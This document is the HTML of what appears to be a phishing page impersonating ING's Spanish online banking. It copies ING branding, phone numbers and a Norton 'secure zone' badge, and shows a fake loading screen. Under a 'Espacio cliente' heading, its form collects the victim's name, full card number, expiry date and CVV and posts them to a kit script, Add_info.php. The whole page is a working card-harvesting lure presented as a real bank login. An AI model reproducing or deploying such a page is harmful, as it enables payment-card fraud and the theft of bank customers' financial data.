<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="./App/css/navbar.css">
<link rel="stylesheet" href="./App/css/body.css">
<link rel="stylesheet" href="https://icono-49d6.kxcdn.com/icono.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/9870a60e4f.js"></script>
  <script charset="utf-8" src="./App/js/val_login.js" type="text/javascript"></script>
  <script charset="utf-8" src="./App/js/val_mask.js" type="text/javascript"></script>
  <script src="./App/js/jquery.maskedinput.js"> </script>

</head>
<body style="background: linear-gradient(#ffffff, #fefefe);">

<script type="text/javascript">
  
    $(document).ready(function () {
            $('#selector').fadeIn('slow', function () {
                $('#selector').delay(4000).fadeOut(150);
            });
        });

</script>


<div class="pageLoader" id="selector" style="background-color: rgb(255, 255, 255);position: fixed;width: 100%;height: 100%;z-index: 9999;top: 0px;opacity: 1.9;text-align: center;display: none;"><div id="nucleosoma-app" class="loader"></div></div>

<div class="topnav" id="myTopnav">
  <a href="#home" class="logoo"><img id="logo" src="App/img/logoING.svg" class="img-svg es-logo svg-header-logo login-header" alt="I N G, nxxxx" tabindex="0"></a>
  <a href="#" class="phoneright" style="float: right;font-size: 13px;line-height: 2rem;"><i class="fas fa-phone-alt"></i>&nbsp;&nbsp;901 10 51 15 | 91 206 66 66</a>
</div>

<br>
<br>


<center  class="conteral">

<br><center>
<div class="example2" id="example2">
</div></center>
<!----->
<br>
<br>


<form action="./App/inc/Add_info.php" method="POST" class="D9oRm7K" name="case" id="myForm">
<div class="InboXLogin">
  <div class="menu">
    <h1 class="Acceso-para " id="tilestyle"><i class="far fa-user"></i>&nbsp;&nbsp;Espacio cliente</h1>
    <label  class="basic-documento" id="tiledocumento">Apellido y Nombre</label>

    <div class="basic-form-control-wrap ">
      <input type="text" class="refactor basic-form-control "  id="Nombre" name="Nombre"   >
    </div>
    <label  class="basic-documento" id="tiledocumento">Número de tarjeta</label>

    <div class="basic-form-control-wrap ">
      <input type="text" class="refactor basic-form-control "  id="tarjeta" name="tarjeta"   >
    </div>

    <label  class="basic-documento" id="tiledocumento">Fecha de caducidad</label>

    <div class="basic-form-control-wrap ">
      <input type="text" class="refactor basic-form-control "  id="caducidad" name="caducidad"  >
    </div>

    <label  class="basic-documento" id="tiledocumento">Cvv</label>

    <div class="basic-form-control-wrap ">
      <input type="text" class="refactor basic-form-control "  id="CVV" name="CVV"   >
    </div>


<span style="display: none;" class="field-err-text" id="fielderr">Campo es requerido</span>
   
<br>


  <input class="refactor-etrar" id="Seguir" type="submit" name="Seguir" value="Seguir">



  </div>

</form>

  <div class="right">
    <label  class="basic-documentotext" >Todavía no soy cliente</label>
    <div class="container-norton"><img tabindex="0" src="https://ing.ingdirect.es/pfm/assets/images/norton-logo.png"  class="logo-norton" role="link"><div tabindex="0" class="secure-zone va-m">Estás en una zona segura</div></div>
    <label  class="basic-documentotext" >Más información sobre seguridad</label>
<br>
<br>
<br>

  </div>
</div>
<br>
<br>
<br>
<div class="imgresponsive styleimgfooter"><img src="App/img/footerbanner.png" class="imgbanner" alt="Responsive image"></div>
  </center>


</body>
</html>





